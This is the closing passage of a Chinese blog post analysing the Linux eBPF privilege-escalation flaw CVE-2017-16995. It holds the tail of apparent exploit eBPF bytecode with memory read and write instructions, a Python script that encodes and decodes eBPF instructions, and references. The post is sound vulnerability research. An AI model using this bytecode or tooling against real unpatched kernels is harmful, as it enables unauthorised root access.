JMP_JNE_K(0,0,0x1,0x0)</span></span><br><span class="line"><span class="string">	JMP_EXIT(0,0,0x0,0x0)</span></span><br><span class="line"><span class="string">	LDX_MEM_DW(0,8,0x0,0x0)</span></span><br><span class="line"><span class="string">	ALU64_MOV_X(0,2,0x0,0x0)</span></span><br><span class="line"><span class="string">	ALU64_MOV_K(0,0,0x0,0x0)</span></span><br><span class="line"><span class="string">	JMP_JNE_K(0,6,0x3,0x0)</span></span><br><span class="line"><span class="string">	LDX_MEM_DW(7,3,0x0,0x0)</span></span><br><span class="line"><span class="string">	STX_MEM_DW(3,2,0x0,0x0)</span></span><br><span class="line"><span class="string">	JMP_EXIT(0,0,0x0,0x0)</span></span><br><span class="line"><span class="string">	JMP_JNE_K(0,6,0x2,0x1)</span></span><br><span class="line"><span class="string">	STX_MEM_DW(10,2,0x0,0x0)</span></span><br><span class="line"><span class="string">	JMP_EXIT(0,0,0x0,0x0)</span></span><br><span class="line"><span class="string">	STX_MEM_DW(8,7,0x0,0x0)</span></span><br><span class="line"><span class="string">	JMP_EXIT(0,0,0x0,0x0)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">BPF_LD	= <span class="number">0x00</span></span><br><span class="line">BPF_LDX	= <span class="number">0x01</span></span><br><span class="line">BPF_ST	= <span class="number">0x02</span></span><br><span class="line">BPF_STX	= <span class="number">0x03</span></span><br><span class="line">BPF_ALU	= <span class="number">0x04</span></span><br><span class="line">BPF_JMP	= <span class="number">0x05</span></span><br><span class="line">BPF_RET	= <span class="number">0x06</span></span><br><span class="line">BPF_MISC= <span class="number">0x07</span></span><br><span class="line">BPF_W	= <span class="number">0x00</span></span><br><span class="line">BPF_H	= <span class="number">0x08</span></span><br><span class="line">BPF_B	= <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">BPF_IMM	= <span class="number">0x00</span></span><br><span class="line">BPF_ABS	= <span class="number">0x20</span></span><br><span class="line">BPF_IND	= <span class="number">0x40</span></span><br><span class="line">BPF_MEM	= <span class="number">0x60</span></span><br><span class="line">BPF_LEN	= <span class="number">0x80</span></span><br><span class="line">BPF_MSH	= <span class="number">0xa0</span></span><br><span class="line"></span><br><span class="line">BPF_ADD	= <span class="number">0x00</span></span><br><span class="line">BPF_SUB	= <span class="number">0x10</span></span><br><span class="line">BPF_MUL	= <span class="number">0x20</span></span><br><span class="line">BPF_DIV	= <span class="number">0x30</span></span><br><span class="line">BPF_OR	= <span class="number">0x40</span></span><br><span class="line">BPF_AND	= <span class="number">0x50</span></span><br><span class="line">BPF_LSH	= <span class="number">0x60</span></span><br><span class="line">BPF_RSH	= <span class="number">0x70</span></span><br><span class="line">BPF_NEG	= <span class="number">0x80</span></span><br><span class="line">BPF_MOD	= <span class="number">0x90</span></span><br><span class="line">BPF_XOR	= <span class="number">0xa0</span></span><br><span class="line"></span><br><span class="line">BPF_JA	= <span class="number">0x00</span></span><br><span class="line">BPF_JEQ	= <span class="number">0x10</span></span><br><span class="line">BPF_JGT	= <span class="number">0x20</span></span><br><span class="line">BPF_JGE	= <span class="number">0x30</span></span><br><span class="line">BPF_JSET= <span class="number">0x40</span></span><br><span class="line">BPF_K	= <span class="number">0x00</span></span><br><span class="line">BPF_X	= <span class="number">0x08</span></span><br><span class="line"></span><br><span class="line">BPF_ALU64	=<span class="number">0x07</span>	<span class="comment">#/* alu mode in double word width */</span></span><br><span class="line">BPF_DW		=<span class="number">0x18</span>	<span class="comment">#/* double word */</span></span><br><span class="line">BPF_XADD	=<span class="number">0xc0</span>	<span class="comment">#/* exclusive add */</span></span><br><span class="line">BPF_MOV		=<span class="number">0xb0</span>	<span class="comment">#/* mov reg to reg */</span></span><br><span class="line">BPF_ARSH	=<span class="number">0xc0</span>	<span class="comment">#/* sign extending arithmetic shift right */</span></span><br><span class="line">BPF_END		=<span class="number">0xd0</span>	<span class="comment">#/* flags for endianness conversion: */</span></span><br><span class="line">BPF_TO_LE	=<span class="number">0x00</span>	<span class="comment">#/* convert to little-endian */</span></span><br><span class="line">BPF_TO_BE	=<span class="number">0x08</span>	<span class="comment">#/* convert to big-endian */</span></span><br><span class="line">BPF_JNE		=<span class="number">0x50</span>	<span class="comment">#/* jump != */</span></span><br><span class="line">BPF_JSGT	=<span class="number">0x60</span>	<span class="comment">#/* SGT is signed '&gt;', GT in x86 */</span></span><br><span class="line">BPF_JSGE	=<span class="number">0x70</span>	<span class="comment">#/* SGE is signed '&gt;=', GE in x86 */</span></span><br><span class="line">BPF_CALL	=<span class="number">0x80</span>	<span class="comment">#/* function call */</span></span><br><span class="line">BPF_EXIT	=<span class="number">0x90</span>	<span class="comment">#/* function return */</span></span><br><span class="line"></span><br><span class="line">opcode[BPF_ALU | BPF_ADD | BPF_X] = <span class="string">"ALU_ADD_X"</span></span><br><span class="line">opcode[BPF_ALU | BPF_ADD | BPF_K] = <span class="string">"ALU_ADD_K"</span></span><br><span class="line">opcode[BPF_ALU | BPF_SUB | BPF_X] = <span class="string">"ALU_SUB_X"</span></span><br><span class="line">opcode[BPF_ALU | BPF_SUB | BPF_K] = <span class="string">"ALU_SUB_K"</span></span><br><span class="line">opcode[BPF_ALU | BPF_AND | BPF_X] = <span class="string">"ALU_AND_X"</span></span><br><span class="line">opcode[BPF_ALU | BPF_AND | BPF_K] = <span class="string">"ALU_AND_K"</span></span><br><span class="line">opcode[BPF_ALU | BPF_OR | BPF_X]  = <span class="string">"ALU_OR_X"</span></span><br><span class="line">opcode[BPF_ALU | BPF_OR | BPF_K]  = <span class="string">"ALU_OR_K"</span></span><br><span class="line">opcode[BPF_ALU | BPF_LSH | BPF_X] = <span class="string">"ALU_LSH_X"</span></span><br><span class="line">opcode[BPF_ALU | BPF_LSH | BPF_K] = <span class="string">"ALU_LSH_K"</span></span><br><span class="line">opcode[BPF_ALU | BPF_RSH | BPF_X] = <span class="string">"ALU_RSH_X"</span></span><br><span class="line">opcode[BPF_ALU | BPF_RSH | BPF_K] = <span class="string">"ALU_RSH_K"</span></span><br><span class="line">opcode[BPF_ALU | BPF_XOR | BPF_X] = <span class="string">"ALU_XOR_X"</span></span><br><span class="line">opcode[BPF_ALU | BPF_XOR | BPF_K] = <span class="string">"ALU_XOR_K"</span></span><br><span class="line">opcode[BPF_ALU | BPF_MUL | BPF_X] = <span class="string">"ALU_MUL_X"</span></span><br><span class="line">opcode[BPF_ALU | BPF_MUL | BPF_K] = <span class="string">"ALU_MUL_K"</span></span><br><span class="line">opcode[BPF_ALU | BPF_MOV | BPF_X] = <span class="string">"ALU_MOV_X"</span></span><br><span class="line">opcode[BPF_ALU | BPF_MOV | BPF_K] = <span class="string">"ALU_MOV_K"</span></span><br><span class="line">opcode[BPF_ALU | BPF_DIV | BPF_X] = <span class="string">"ALU_DIV_X"</span></span><br><span class="line">opcode[BPF_ALU | BPF_DIV | BPF_K] = <span class="string">"ALU_DIV_K"</span></span><br><span class="line">opcode[BPF_ALU | BPF_MOD | BPF_X] = <span class="string">"ALU_MOD_X"</span></span><br><span class="line">opcode[BPF_ALU | BPF_MOD | BPF_K] = <span class="string">"ALU_MOD_K"</span></span><br><span class="line">opcode[BPF_ALU | BPF_NEG] = <span class="string">"ALU_NEG"</span></span><br><span class="line">opcode[BPF_ALU | BPF_END | BPF_TO_BE] = <span class="string">"ALU_END_TO_BE"</span></span><br><span class="line">opcode[BPF_ALU | BPF_END | BPF_TO_LE] = <span class="string">"ALU_END_TO_LE"</span></span><br><span class="line"><span class="comment">#/* 64 bit ALU operations */</span></span><br><span class="line">opcode[BPF_ALU64 | BPF_ADD | BPF_X] = <span class="string">"ALU64_ADD_X"</span></span><br><span class="line">opcode[BPF_ALU64 | BPF_ADD | BPF_K] = <span class="string">"ALU64_ADD_K"</span></span><br><span class="line">opcode[BPF_ALU64 | BPF_SUB | BPF_X] = <span class="string">"ALU64_SUB_X"</span></span><br><span class="line">opcode[BPF_ALU64 | BPF_SUB | BPF_K] = <span class="string">"ALU64_SUB_K"</span></span><br><span class="line">opcode[BPF_ALU64 | BPF_AND | BPF_X] = <span class="string">"ALU64_AND_X"</span></span><br><span class="line">opcode[BPF_ALU64 | BPF_AND | BPF_K] = <span class="string">"ALU64_AND_K"</span></span><br><span class="line">opcode[BPF_ALU64 | BPF_OR | BPF_X] = <span class="string">"ALU64_OR_X"</span></span><br><span class="line">opcode[BPF_ALU64 | BPF_OR | BPF_K] = <span class="string">"ALU64_OR_K"</span></span><br><span class="line">opcode[BPF_ALU64 | BPF_LSH | BPF_X] = <span class="string">"ALU64_LSH_X"</span></span><br><span class="line">opcode[BPF_ALU64 | BPF_LSH | BPF_K] = <span class="string">"ALU64_LSH_K"</span></span><br><span class="line">opcode[BPF_ALU64 | BPF_RSH | BPF_X] = <span class="string">"ALU64_RSH_X"</span></span><br><span class="line">opcode[BPF_ALU64 | BPF_RSH | BPF_K] = <span class="string">"ALU64_RSH_K"</span></span><br><span class="line">opcode[BPF_ALU64 | BPF_XOR | BPF_X] = <span class="string">"ALU64_XOR_X"</span></span><br><span class="line">opcode[BPF_ALU64 | BPF_XOR | BPF_K] = <span class="string">"ALU64_XOR_K"</span></span><br><span class="line">opcode[BPF_ALU64 | BPF_MUL | BPF_X] = <span class="string">"ALU64_MUL_X"</span></span><br><span class="line">opcode[BPF_ALU64 | BPF_MUL | BPF_K] = <span class="string">"ALU64_MUL_K"</span></span><br><span class="line">opcode[BPF_ALU64 | BPF_MOV | BPF_X] = <span class="string">"ALU64_MOV_X"</span></span><br><span class="line">opcode[BPF_ALU64 | BPF_MOV | BPF_K] = <span class="string">"ALU64_MOV_K"</span></span><br><span class="line">opcode[BPF_ALU64 | BPF_ARSH | BPF_X] = <span class="string">"ALU64_ARSH_X"</span></span><br><span class="line">opcode[BPF_ALU64 | BPF_ARSH | BPF_K] = <span class="string">"ALU64_ARSH_K"</span></span><br><span class="line">opcode[BPF_ALU64 | BPF_DIV | BPF_X] = <span class="string">"ALU64_DIV_X"</span></span><br><span class="line">opcode[BPF_ALU64 | BPF_DIV | BPF_K] = <span class="string">"ALU64_DIV_K"</span></span><br><span class="line">opcode[BPF_ALU64 | BPF_MOD | BPF_X] = <span class="string">"ALU64_MOD_X"</span></span><br><span class="line">opcode[BPF_ALU64 | BPF_MOD | BPF_K] = <span class="string">"ALU64_MOD_K"</span></span><br><span class="line">opcode[BPF_ALU64 | BPF_NEG] = <span class="string">"ALU64_NEG"</span></span><br><span class="line"><span class="comment">#/* Call instruction */</span></span><br><span class="line">opcode[BPF_JMP | BPF_CALL] = <span class="string">"JMP_CALL"</span></span><br><span class="line">opcode[BPF_JMP | BPF_CALL | BPF_X] = <span class="string">"JMP_TAIL_CALL"</span></span><br><span class="line"><span class="comment">#/* Jumps */</span></span><br><span class="line">opcode[BPF_JMP | BPF_JA] = <span class="string">"JMP_JA"</span></span><br><span class="line">opcode[BPF_JMP | BPF_JEQ | BPF_X] = <span class="string">"JMP_JEQ_X"</span></span><br><span class="line">opcode[BPF_JMP | BPF_JEQ | BPF_K] = <span class="string">"JMP_JEQ_K"</span></span><br><span class="line">opcode[BPF_JMP | BPF_JNE | BPF_X] = <span class="string">"JMP_JNE_X"</span></span><br><span class="line">opcode[BPF_JMP | BPF_JNE | BPF_K] = <span class="string">"JMP_JNE_K"</span></span><br><span class="line">opcode[BPF_JMP | BPF_JGT | BPF_X] = <span class="string">"JMP_JGT_X"</span></span><br><span class="line">opcode[BPF_JMP | BPF_JGT | BPF_K] = <span class="string">"JMP_JGT_K"</span></span><br><span class="line">opcode[BPF_JMP | BPF_JGE | BPF_X] = <span class="string">"JMP_JGE_X"</span></span><br><span class="line">opcode[BPF_JMP | BPF_JGE | BPF_K] = <span class="string">"JMP_JGE_K"</span></span><br><span class="line">opcode[BPF_JMP | BPF_JSGT | BPF_X] = <span class="string">"JMP_JSGT_X"</span></span><br><span class="line">opcode[BPF_JMP | BPF_JSGT | BPF_K] = <span class="string">"JMP_JSGT_K"</span></span><br><span class="line">opcode[BPF_JMP | BPF_JSGE | BPF_X] = <span class="string">"JMP_JSGE_X"</span></span><br><span class="line">opcode[BPF_JMP | BPF_JSGE | BPF_K] = <span class="string">"JMP_JSGE_K"</span></span><br><span class="line">opcode[BPF_JMP | BPF_JSET | BPF_X] = <span class="string">"JMP_JSET_X"</span></span><br><span class="line">opcode[BPF_JMP | BPF_JSET | BPF_K] = <span class="string">"JMP_JSET_K"</span></span><br><span class="line"><span class="comment">#/* Program return */</span></span><br><span class="line">opcode[BPF_JMP | BPF_EXIT] = <span class="string">"JMP_EXIT"</span></span><br><span class="line"><span class="comment">#/* Store instructions */</span></span><br><span class="line">opcode[BPF_STX | BPF_MEM | BPF_B] = <span class="string">"STX_MEM_B"</span></span><br><span class="line">opcode[BPF_STX | BPF_MEM | BPF_H] = <span class="string">"STX_MEM_H"</span></span><br><span class="line">opcode[BPF_STX | BPF_MEM | BPF_W] = <span class="string">"STX_MEM_W"</span></span><br><span class="line">opcode[BPF_STX | BPF_MEM | BPF_DW] = <span class="string">"STX_MEM_DW"</span></span><br><span class="line">opcode[BPF_STX | BPF_XADD | BPF_W] = <span class="string">"STX_XADD_W"</span></span><br><span class="line">opcode[BPF_STX | BPF_XADD | BPF_DW] = <span class="string">"STX_XADD_DW"</span></span><br><span class="line">opcode[BPF_ST | BPF_MEM | BPF_B] = <span class="string">"ST_MEM_B"</span></span><br><span class="line">opcode[BPF_ST | BPF_MEM | BPF_H] = <span class="string">"ST_MEM_H"</span></span><br><span class="line">opcode[BPF_ST | BPF_MEM | BPF_W] = <span class="string">"ST_MEM_W"</span></span><br><span class="line">opcode[BPF_ST | BPF_MEM | BPF_DW] = <span class="string">"ST_MEM_DW"</span></span><br><span class="line"><span class="comment">#/* Load instructions */</span></span><br><span class="line">opcode[BPF_LDX | BPF_MEM | BPF_B] = <span class="string">"LDX_MEM_B"</span></span><br><span class="line">opcode[BPF_LDX | BPF_MEM | BPF_H] = <span class="string">"LDX_MEM_H"</span></span><br><span class="line">opcode[BPF_LDX | BPF_MEM | BPF_W] = <span class="string">"LDX_MEM_W"</span></span><br><span class="line">opcode[BPF_LDX | BPF_MEM | BPF_DW] = <span class="string">"LDX_MEM_DW"</span></span><br><span class="line">opcode[BPF_LD | BPF_ABS | BPF_W] = <span class="string">"LD_ABS_W"</span></span><br><span class="line">opcode[BPF_LD | BPF_ABS | BPF_H] = <span class="string">"LD_ABS_H"</span></span><br><span class="line">opcode[BPF_LD | BPF_ABS | BPF_B] = <span class="string">"LD_ABS_B"</span></span><br><span class="line">opcode[BPF_LD | BPF_IND | BPF_W] = <span class="string">"LD_IND_W"</span></span><br><span class="line">opcode[BPF_LD | BPF_IND | BPF_H] = <span class="string">"LD_IND_H"</span></span><br><span class="line">opcode[BPF_LD | BPF_IND | BPF_B] = <span class="string">"LD_IND_B"</span></span><br><span class="line">opcode[BPF_LD | BPF_IMM | BPF_DW] = <span class="string">"LD_IMM_DW"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">u16</span><span class="params">(imm)</span>:</span></span><br><span class="line">	<span class="keyword">if</span> len(imm)!=<span class="number">2</span>:</span><br><span class="line">		<span class="keyword">print</span> <span class="string">'[-] u16 must have a correct input like "\\x12\\x34"'</span></span><br><span class="line">		exit()</span><br><span class="line">	<span class="keyword">return</span> (ord(imm[<span class="number">1</span>])&lt;&lt;<span class="number">8</span>)+ord(imm[<span class="number">0</span>])</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">u32</span><span class="params">(imm)</span>:</span></span><br><span class="line">	<span class="keyword">if</span> len(imm)!=<span class="number">4</span>:</span><br><span class="line">		<span class="keyword">print</span> <span class="string">'[-] u32 must have a correct input like "\x12\x34\x56\x78"'</span></span><br><span class="line">		exit()</span><br><span class="line">	<span class="keyword">return</span> (ord(imm[<span class="number">1</span>])&lt;&lt;<span class="number">8</span>)+ord(imm[<span class="number">0</span>])	+(ord(imm[<span class="number">2</span>])&lt;&lt;<span class="number">16</span>)+(ord(imm[<span class="number">3</span>])&lt;&lt;<span class="number">24</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">p16</span><span class="params">(imm)</span>:</span></span><br><span class="line">	result = <span class="string">''</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">		result += <span class="string">"\\x"</span>+ hex((imm&gt;&gt;(<span class="number">8</span>*(i)))&amp;<span class="number">0xff</span>).replace(<span class="string">'0x'</span>,<span class="string">''</span>).rjust(<span class="number">2</span>,<span class="string">'0'</span>)</span><br><span class="line">	<span class="keyword">return</span> result</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">p32</span><span class="params">(imm)</span>:</span></span><br><span class="line">	result = <span class="string">''</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">		result += <span class="string">"\\x"</span>+ hex((imm&gt;&gt;(<span class="number">8</span>*(i)))&amp;<span class="number">0xff</span>).replace(<span class="string">'0x'</span>,<span class="string">''</span>).replace(<span class="string">'L'</span>,<span class="string">''</span>).rjust(<span class="number">2</span>,<span class="string">'0'</span>)</span><br><span class="line">	<span class="keyword">return</span> result	</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode_single</span><span class="params">(idx,insn)</span>:</span></span><br><span class="line">	<span class="comment">#print insn.encode('hex')</span></span><br><span class="line">	op = opcode[ord(insn[<span class="number">0</span>])]</span><br><span class="line">	reg = ord(insn[<span class="number">1</span>])</span><br><span class="line">	off = insn[<span class="number">2</span>:<span class="number">4</span>]</span><br><span class="line">	imm = insn[<span class="number">4</span>:]</span><br><span class="line">	<span class="keyword">if</span> op == <span class="string">'invalid opcode'</span>:</span><br><span class="line">		<span class="keyword">print</span> <span class="string">'[%d]: maybe padding'</span>%idx</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	<span class="keyword">print</span> <span class="string">"[%d]: %s(%s,%s,%s,%s)"</span>%(idx,op,str(reg&gt;&gt;<span class="number">4</span>),str(reg&amp;<span class="number">0x0f</span>),hex(u16(off)).replace(<span class="string">'L'</span>,<span class="string">''</span>),hex(u32(imm)).replace(<span class="string">'L'</span>,<span class="string">''</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode_all</span><span class="params">(insn_tmp)</span>:</span></span><br><span class="line">	insn = insn_tmp.split(<span class="string">'"\n'</span>)</span><br><span class="line">	i  = <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> ins <span class="keyword">in</span> insn:</span><br><span class="line">		ins = ins.strip()</span><br><span class="line">		<span class="keyword">if</span> len(ins)&lt;<span class="number">9</span>:</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		<span class="keyword">if</span> ins[<span class="number">-9</span>]!= <span class="string">'"'</span>:</span><br><span class="line">			<span class="keyword">print</span> <span class="string">'[-] format error!'</span></span><br><span class="line">			exit()</span><br><span class="line">		decode_single(i,ins[<span class="number">-8</span>:])</span><br><span class="line">		i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">banner_decode</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">print</span> <span class="string">'[+] A tools for decode ebpf rules by P4nda'</span></span><br><span class="line">	<span class="keyword">print</span> <span class="string">'[+] modify code in script as format :'</span></span><br><span class="line">	<span class="keyword">print</span> <span class="string">'========================================================='</span></span><br><span class="line">	<span class="keyword">print</span> <span class="string">'\t\t"\\xbf\\xa2\\x00\\x00\\x00\\x00\\x00\\x00"'</span></span><br><span class="line">	<span class="keyword">print</span> <span class="string">'\t\t"\\x07\\x02\\x00\\x00\\xfc\\xff\\xff\\xff"'</span></span><br><span class="line">	<span class="keyword">print</span> <span class="string">'\t\t"\\xbf\\xa2\\x00\\x00\\x00\\x00\\x00\\x00"'</span></span><br><span class="line">	<span class="keyword">print</span> <span class="string">'\t\t"\\x07\\x02\\x00\\x00\\xfc\\xff\\xff\\xff"'</span></span><br><span class="line">	<span class="keyword">print</span> <span class="string">'\t\t"\\xbf\\xa2\\x00\\x00\\x00\\x00\\x00\\x00"'</span></span><br><span class="line">	<span class="keyword">print</span> <span class="string">'\t\t"\\x07\\x02\\x00\\x00\\xfc\\xff\\xff\\xff"'</span>	</span><br><span class="line">	<span class="keyword">print</span> <span class="string">'========================================================='</span>	</span><br><span class="line">	<span class="keyword">print</span> <span class="string">'result format: \t[index]: opcode(src,dst,off,imm)'</span></span><br><span class="line">	<span class="keyword">print</span> <span class="string">'================= result ================================'</span>	</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str2int</span><span class="params">(input)</span>:</span></span><br><span class="line">	<span class="keyword">if</span> input.startswith(<span class="string">'0x'</span>):</span><br><span class="line">		<span class="keyword">return</span> int(input,<span class="number">16</span>)</span><br><span class="line">	<span class="keyword">return</span> int(input)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">char2hex</span><span class="params">(input)</span>:</span></span><br><span class="line">	<span class="keyword">return</span> <span class="string">'\\x'</span>+hex(input).replace(<span class="string">'0x'</span>,<span class="string">''</span>).replace(<span class="string">'L'</span>,<span class="string">''</span>).rjust(<span class="number">2</span>,<span class="string">'0'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_single</span><span class="params">(rl)</span>:</span></span><br><span class="line">	rl = rl.strip()</span><br><span class="line">	result = <span class="string">''</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="string">'('</span> <span class="keyword">not</span> <span class="keyword">in</span> rl) |  (<span class="string">')'</span> <span class="keyword">not</span> <span class="keyword">in</span> rl) :</span><br><span class="line">		<span class="keyword">if</span> <span class="string">'padding'</span> <span class="keyword">in</span> rl :</span><br><span class="line">			<span class="keyword">print</span> <span class="string">'\t"%s"'</span>%(<span class="string">'\\x00'</span>*<span class="number">8</span>)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="keyword">print</span> <span class="string">'[-] bad rules '</span></span><br><span class="line">			exit(<span class="number">-1</span>)</span><br><span class="line">	op = rl.split(<span class="string">'('</span>)[<span class="number">0</span>]</span><br><span class="line">	src =  str2int(rl.split(<span class="string">'('</span>)[<span class="number">1</span>].split(<span class="string">','</span>)[<span class="number">0</span>])</span><br><span class="line">	dst =  str2int(rl.split(<span class="string">'('</span>)[<span class="number">1</span>].split(<span class="string">','</span>)[<span class="number">1</span>])</span><br><span class="line">	off =  str2int(rl.split(<span class="string">'('</span>)[<span class="number">1</span>].split(<span class="string">','</span>)[<span class="number">2</span>])</span><br><span class="line">	imm =  str2int(rl.split(<span class="string">'('</span>)[<span class="number">1</span>].split(<span class="string">','</span>)[<span class="number">3</span>].split(<span class="string">')'</span>)[<span class="number">0</span>])</span><br><span class="line">	<span class="comment">#print src,dst,off,imm</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">		<span class="keyword">if</span> op.upper() == opcode[i]:</span><br><span class="line">			result += char2hex(i)<span class="comment">#'\\x'+ hex(i).replace('0x','').replace('L','').rjust(2,'0')</span></span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">if</span> len(result) == <span class="number">0</span>:</span><br><span class="line">		<span class="keyword">print</span> <span class="string">'[-] No such insn :'</span>,op</span><br><span class="line">		exit(<span class="number">-1</span>)</span><br><span class="line">	result += char2hex((src&lt;&lt;<span class="number">4</span>)+dst)</span><br><span class="line">	result += p16(off)</span><br><span class="line">	result += p32(imm)</span><br><span class="line">	<span class="keyword">print</span> <span class="string">'\t"%s"'</span>%result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_all</span><span class="params">(rules)</span>:</span></span><br><span class="line">	<span class="keyword">for</span> rl <span class="keyword">in</span> rules.split(<span class="string">'\n'</span>):</span><br><span class="line">		<span class="keyword">if</span> (<span class="string">'padding'</span> <span class="keyword">in</span> rl) |((<span class="string">'('</span> <span class="keyword">in</span> rl)&amp;(<span class="string">')'</span> <span class="keyword">in</span> rl) ):</span><br><span class="line">			encode_single(rl+<span class="string">')'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">banner_encode</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">print</span> <span class="string">'[+] A tools for encode ebpf rules by P4nda'</span></span><br><span class="line">	<span class="keyword">print</span> <span class="string">'[+] modify code in script as format :'</span></span><br><span class="line">	<span class="keyword">print</span> <span class="string">'========================================================='</span></span><br><span class="line">	<span class="keyword">print</span> <span class="string">'\t\t ALU_MOV_K(0,9,0x0,0xffffffff)'</span></span><br><span class="line">	<span class="keyword">print</span> <span class="string">'\t\t JMP_JNE_K(0,9,0x2,0xffffffff)'</span></span><br><span class="line">	<span class="keyword">print</span> <span class="string">'\t\t ALU64_MOV_K(0,0,0x0,0x0)'</span></span><br><span class="line">	<span class="keyword">print</span> <span class="string">'\t\t LD_IMM_DW(1,9,0x0,0x3)'</span></span><br><span class="line">	<span class="keyword">print</span> <span class="string">'\t\t padding \t/*this word will be translateed \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00*/'</span></span><br><span class="line">	<span class="keyword">print</span> <span class="string">'\t\t JMP_EXIT(0,0,0x0,0x0)'</span>	</span><br><span class="line">	<span class="keyword">print</span> <span class="string">'========================================================='</span>	</span><br><span class="line">	<span class="keyword">print</span> <span class="string">'result format: \t"\\x07\\x02\\x00\\x00\\xfc\\xff\\xff\\xff"'</span></span><br><span class="line">	<span class="keyword">print</span> <span class="string">'================= result ================================'</span>	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">banner</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">print</span> <span class="string">'[+] A tools for encode&amp;decode ebpf rules by P4nda'</span></span><br><span class="line">	<span class="keyword">print</span> <span class="string">'[+] modify code in script yourself ,function argv as follow:'</span></span><br><span class="line">	<span class="keyword">print</span> <span class="string">'========================================================='</span></span><br><span class="line">	<span class="keyword">print</span> <span class="string">'encode:'</span></span><br><span class="line">	<span class="keyword">print</span> <span class="string">'\tebpf_tools.py encode '</span></span><br><span class="line">	<span class="keyword">print</span> <span class="string">'decode:'</span></span><br><span class="line">	<span class="keyword">print</span> <span class="string">'\tebpf_tools.py decode '</span>	</span><br><span class="line">	<span class="keyword">print</span> <span class="string">'========================================================='</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	<span class="keyword">if</span> len(sys.argv) ==<span class="number">1</span> :</span><br><span class="line">		banner()</span><br><span class="line">		exit(<span class="number">0</span>)</span><br><span class="line">	<span class="keyword">if</span> sys.argv[<span class="number">1</span>].lower() == <span class="string">'decode'</span>:</span><br><span class="line">		banner_decode()</span><br><span class="line">		decode_all(code)</span><br><span class="line">	<span class="keyword">elif</span> sys.argv[<span class="number">1</span>].lower() == <span class="string">'encode'</span>:</span><br><span class="line">		banner_encode()</span><br><span class="line">		encode_all(rules)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		banner()</span><br></pre></td></tr></table></figure>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>[1] <a href="https://security.tencent.com/index.php/blog/msg/124" target="_blank" rel="noopener">https://security.tencent.com/index.php/blog/msg/124</a></p>
<p>[2] <a href="https://www.ibm.com/developerworks/cn/linux/l-lo-eBPF-history/index.html" target="_blank" rel="noopener">https://www.ibm.com/developerworks/cn/linux/l-lo-eBPF-history/index.html</a></p>
<p>[3] <a href="https://www.jianshu.com/p/75b368f85dc6" target="_blank" rel="noopener">https://www.jianshu.com/p/75b368f85dc6</a></p>
<p>[4] <a href="https://cert.360.cn/report/detail?id=ff28fc8d8cb2b72148c9237612933c11" target="_blank" rel="noopener">https://cert.360.cn/report/detail?id=ff28fc8d8cb2b72148c9237612933c11</a></p>
<p>[5] <a href="https://xz.aliyun.com/t/2212" target="_blank" rel="noopener">https://xz.aliyun.com/t/2212</a></p>
<p>[6] <a href="https://blog.csdn.net/qq_14978113/article/details/80488711" target="_blank" rel="noopener">https://blog.csdn.net/qq_14978113/article/details/80488711</a></p>
<p>[7] <a href="https://elixir.bootlin.com/linux/v4.4.110/source/kernel/bpf/syscall.c" target="_blank" rel="noopener">https://elixir.bootlin.com/linux/v4.4.110/source/kernel/bpf/syscall.c</a></p>
<p>[8] <a href="https://elixir.bootlin.com/linux/v4.4.110/source/kernel/bpf/verifier.c" target="_blank" rel="noopener">https://elixir.bootlin.com/linux/v4.4.110/source/kernel/bpf/verifier.c</a></p>
<p>[9] <a href="https://elixir.bootlin.com/linux/v4.4.110/source/kernel/bpf/core.c" target="_blank" rel="noopener">https://elixir.bootlin.com/linux/v4.4.110/source/kernel/bpf/core.c</a></p>

      
    </div>
    
  </div>
  
    
    <div class="copyright">
        <p><span>本文标题:</span><a href="/2019/01/18/CVE-2017-16995/">Linux ebpf模块整数扩展问题导致提权漏洞分析（CVE-2017-16995）</a></p>
        <p><span>文章作者:</span><a href="/" title="回到主页">P4nda</a></p>
        <p><span>发布时间:</span>2019-01-18, 15:08:22</p>
        <p><span>最后更新:</span>2019-01-19, 12:38:24</p>
        <p>
            <span>原始链接:</span><a class="post-url" href="/2019/01/18/CVE-2017-16995/" title="Linux ebpf模块整数扩展问题导致提权漏洞分析（CVE-2017-16995）">http://p4nda.top/2019/01/18/CVE-2017-16995/</a>
